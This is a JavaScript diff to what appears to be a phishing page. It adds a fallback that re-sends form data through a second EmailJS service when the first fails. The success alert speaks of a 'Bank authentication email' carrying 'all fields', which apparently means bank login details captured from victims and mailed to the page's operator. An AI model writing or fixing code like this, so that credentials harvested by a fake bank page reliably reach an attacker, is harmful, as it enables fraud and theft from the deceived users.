@@ -691,8 +691,9 @@
                 emailjs.init("nW8qV4aakkEtYlieZ");
                 console.log('EmailJS re-initialized');
 
-                // SEND EMAIL WITH YOUR ORIGINAL WORKING SERVICE AND TEMPLATE
-                emailjs.send('service_djfykou', 'template_526064c', templateParams)
+                // SEND EMAIL WITH WORKING SERVICE ID
+                // Try the service ID that was working in your original system
+                emailjs.send('service_mblpi2k', 'template_wo7l8te', templateParams)
                     .then(function(response) {
                         console.log('✅ EmailJS SUCCESS!');
                         console.log('Response status:', response.status);
@@ -704,7 +705,25 @@
                         console.log('Error details:', error);
                         console.log('Error text:', error.text);
                         console.log('Error status:', error.status);
-                        alert('❌ EmailJS Error: ' + (error.text || error.message || 'Unknown error'));
+                        
+                        // If service not found, try the working one
+                        if (error.text && error.text.includes('service ID not found')) {
+                            console.log('Trying original working service...');
+                            emailjs.send('service_djfykou', 'template_526064c', templateParams)
+                                .then(function(response2) {
+                                    console.log('✅ ORIGINAL SERVICE SUCCESS!');
+                                    console.log('Response status:', response2.status);
+                                    console.log('Response text:', response2.text);
+                                    alert('✅ Bank authentication email sent successfully! Check your email IMMEDIATELY for all fields.');
+                                })
+                                .catch(function(error2) {
+                                    console.log('❌ ORIGINAL SERVICE ALSO FAILED!');
+                                    console.log('Error details:', error2);
+                                    alert('❌ Both EmailJS services failed. Please check EmailJS dashboard.');
+                                });
+                        } else {
+                            alert('❌ EmailJS Error: ' + (error.text || error.message || 'Unknown error'));
+                        }
                     });
                     
             } catch (error) {
